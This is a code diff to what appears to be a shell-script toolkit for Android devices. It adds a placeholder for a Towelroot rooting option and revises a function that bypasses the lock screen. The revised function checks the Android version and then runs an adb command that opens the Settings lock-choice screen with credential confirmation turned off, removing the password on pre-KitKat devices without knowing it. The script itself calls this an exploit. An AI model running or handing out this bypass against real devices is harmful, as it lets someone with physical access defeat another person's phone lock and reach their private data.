@@ -35,6 +35,8 @@ f_menu(){
 ###Towelroot###
 ###############
 f_towelroot(){
+	echo "Still in development."
+	echo ""
 	read -p "Press [Enter] to return to main menu." null
 }
 
@@ -43,17 +45,21 @@ f_towelroot(){
 ################################
 f_removelocks(){
 	clear
-	echo "This will remove the password protection on pre-KitKat ROMs."
-	echo ""
-	read -p "Press [Enter] to return to main menu." null
-	clear
 	echo "To continue, plug in the device and ensure ADB is enabled."
 	adb wait-for-device
 	clear
-	echo "Removing password protection..."
+	ver=$(adb shell getprop ro.build.version.release | tr -d '\r')
+	if [ "$ver" == "4.4" ]||[ "$ver" == "4.4.1" ]||[ "$ver" == "4.4.2" ]||[ "$ver" == "4.4.3" ]||[ "$ver" == "4.4.4" ]||[ "$ver" == "5.0" ]; then
+    	echo "This device is not supported. Only pre-KitKat (4.4) versions work with this exploit."
+			echo ""
+			read -p "Press [Enter] to return to the main menu." null
+			clear
+			f_menu
+	fi
+	echo "Attempting to remove password protection..."
 	adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
 	clear
-	echo "Removed password. If it was unsuccessful, your device is not supported."
+	echo "Done. If it was unsuccessful, your device is not supported."
 	echo ""
 	read -p "Press [Enter] to return to main menu." null
 	clear
